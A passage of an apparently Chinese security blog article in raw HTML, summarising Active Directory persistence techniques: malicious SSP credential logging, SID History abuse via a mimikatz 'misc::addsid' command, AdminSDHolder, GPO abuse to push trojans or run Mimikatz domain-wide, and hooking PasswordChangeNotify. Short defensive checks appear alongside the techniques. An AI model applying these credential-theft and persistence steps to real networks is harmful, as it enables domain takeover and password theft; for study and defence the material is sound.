-apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;background-color: rgb(255, 255, 255);vertical-align: inherit;font-size:14px;line-height:34px;;">c:/windows/system32可看到新生成的文件kiwissp.log</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="top: auto;left: auto;margin: 12px 279px;right: auto;bottom: auto;font-size:14px;line-height:34px;;"><img class="aligncenter" data-ratio="0.30039011703511054" src="图片/HACK学习呀_2018-12-05_我所了解的内网渗透-内网渗透知识大总结/38_cUPrPZH1FDJNCovfEbMq0HOkoVq4EQ.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8QfeuvouibDeoRUnFC7dcb7yfEpPIibVfm2EcibelLhPxmTkptjVtmrtCcUPrPZH1FDJNCovfEbMq0HOkoVq4EQ/640?wx_fmt=jpeg'" data-type="jpeg" data-w="1538" style="vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">如果不是在域环境下生成的文件会在system32mimilsa.log</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">防：</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">检测注册表位置：</span></p><pre class="pure-highlightjs" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs coffeescript" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;">HKEY_LOCAL_MACHINE<span class="hljs-regexp" style="font-size:14px;line-height:34px;;color: rgb(0, 153, 38);">/System/CurrentControlSet/Control/Lsa/Security Packages/</span></span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">检测％WINDIR％/ System32下是否有可疑的dll</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="top: auto;left: auto;margin: 12px 279px;right: auto;bottom: auto;font-size:14px;line-height:34px;;"><img class="aligncenter" data-ratio="0.6775884665792923" src="图片/HACK学习呀_2018-12-05_我所了解的内网渗透-内网渗透知识大总结/39_XWibU7eBGK894zoticiaD3peib1BKw.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8QfeuvouibDeoRUnFC7dcb7yfEpPIibV1iaO91sLBZQ18leAEQxvPlibP1DZVlXWibU7eBGK894zoticiaD3peib1BKw/640?wx_fmt=jpeg'" data-type="jpeg" data-w="1526" style="vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></p><h3 name="h3-23" style="margin-top: 12px;margin-bottom: 0.5rem;font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;line-height: 2;color: rgba(0, 0, 0, 0.85);font-size:19px;line-height:39px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">SID历史</span></h3><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">https://adsecurity.org/?p=1772</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">SID历史记录允许另一个帐户的访问被有效地克隆到另一个帐户</span></p><pre class="pure-highlightjs" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs nginx" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;"><span class="hljs-attribute" style="font-size:14px;line-height:34px;;color: rgb(0, 0, 128);">mimikatz</span> <span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">"privilege::debug"</span> <span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">"misc::addsid bobafett ADSAdministrator"</span></span></code></pre><h3 name="h3-24" style="margin-top: 12px;margin-bottom: 0.5rem;font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;line-height: 2;color: rgba(0, 0, 0, 0.85);font-size:19px;line-height:39px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">AdminSDHolder的＆SDPROP</span></h3><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">利用AdminSDHolder的＆SDPROP（重新）获取域管理权限</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">https://adsecurity.org/?p=1906</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">AdminSDHolder是位于Active Directory中的系统分区</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">&nbsp;</span></p><h2 name="h2-25" style="margin-top: 12px;margin-bottom: 0.5rem;font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;line-height: 2;color: rgba(0, 0, 0, 0.85);font-size:22px;line-height:42px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">组策略</span></h2><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">https://adsecurity.org/?p=2716</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">策略对象在持久化及横向渗透中的应用</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">https://www.anquanke.com/post/id/86531</span></p><h3 name="h3-26" style="margin-top: 12px;margin-bottom: 0.5rem;font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;line-height: 2;color: rgba(0, 0, 0, 0.85);font-size:19px;line-height:39px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;"></span></h3><h3 name="h3-26" style="margin-top: 12px;margin-bottom: 0.5rem;font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;line-height: 2;color: rgba(0, 0, 0, 0.85);font-size:19px;line-height:39px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">组策略概述</span></h3><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">组策略使管理员能够管理Active Directory中的计算机和用户。组策略保存为组策略对象（GPO）</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">攻击者可以滥用GPO，通过欺诈方式进一步自动化地传播恶意软件、实现持久化驻留目的</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">恶意软件可以利用GPO穿越IDS/IPS等防火墙，最终访问到域内所有的系统。</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">GPO的另一优点就是攻击过程期间并不需要目标系统在线，一旦离线状态下的目标系统重新登录到域中，恶意的GPO载荷就会被投递到目标系统。</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">组策略默认情况下每90分钟（域控制器5分钟）可包括安全选项，注册表项，软件安装以及启动和关闭脚本以及域成员刷新组策略设置。这意味着组策略在目标计算机上执行配置的设置。</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">SYSVOL是所有经过身份验证的用户具有读取权限的Active Directory中的域范围共享。SYSVOL包含登录脚本，组策略数据以及其他域控制器中需要使用的全域数据。</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">SYSVOL共享将自动同步并在所有域控制器之间共享。</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">其实我认为组策略也相当于远控,可以把配置脚本让域内的每一台电脑都种上马批量执行一遍。</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">或者每周在所有域上运行Mimikatz获取明文密码,以及获取某种类型文件这要通过编写脚本实现。</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">远程搜索某个本地文件（如proof.txt）</span></p><pre class="pure-highlightjs" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs php" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;">Get-Content &lt;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">list</span> of IPs&gt; | <span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">ForEach</span>-Object {Getwmiobject CIM_DataFile -filter »Drive=’c:’ <span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">AND</span> Filename=’proof’ <span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">AND</span> extension=’txt’ -Impersonate <span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">3</span> -computername $_ | Select PSComputername, Name -Unique}</span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><a href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&amp;mid=2247484922&amp;idx=1&amp;sn=8e70f47abc6ab0763a8bfc2f02fedbb7&amp;chksm=ec1f50c5db68d9d3fb3a124a54a5493b4a38ba5e8c673f548466d166209b635e1103fe270d16&amp;scene=21#wechat_redirect" target="_blank"><span style="font-size:14px;line-height:34px;;">一篇文章精通PowerShell Empire 2.3（上）</span></a></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">防：</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">定期审核GPO。</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">为GPO使用定义清晰的命名约定</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">记录GPO的创建动作</span></p><h3 name="h3-27" style="margin-top: 12px;margin-bottom: 0.5rem;font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;line-height: 2;color: rgba(0, 0, 0, 0.85);font-size:19px;line-height:39px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">Hook PasswordChangeNotify</span></h3><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">http://wooyun.jozxing.cc/static/drops/tips-13079.html</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">介绍一个更加隐蔽且不需要使用Mimikatz的后门方法，通过Hook PasswordChangeNotify拦截修改的帐户密码。</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">在修改域控密码时会进行如下同步操作：</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">a. 当修改域控密码时，LSA首先调用PasswordFileter来判断新密码是否符合密码复杂度要求</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">b. 如果符合，LSA接着调用PasswordChangeNotify在系统上同步更新密码</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="top: auto;left: auto;margin: 12px 279px;right: auto;bottom: auto;font-size:14px;line-height:34px;;"><img class="aligncenter" data-ratio="0.3920552677029361" src="图片/HACK学习呀_2018-12-05_我所了解的内网渗透-内网渗透知识大总结/40_ZWF9zmoqibaIPiaAOMfnOCEqXalEWA.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8QfeuvouibDeoRUnFC7dcb7yfEpPIibVmd4L681Eg1WnXA9CTr7qUMAKCJZWF9zmoqibaIPiaAOMfnOCEqXalEWA/640?wx_fmt=jpeg'" data-type="jpeg" data-w="1158" style="vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">函数PasswordChangeNotify存在于rassfm.dll</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, 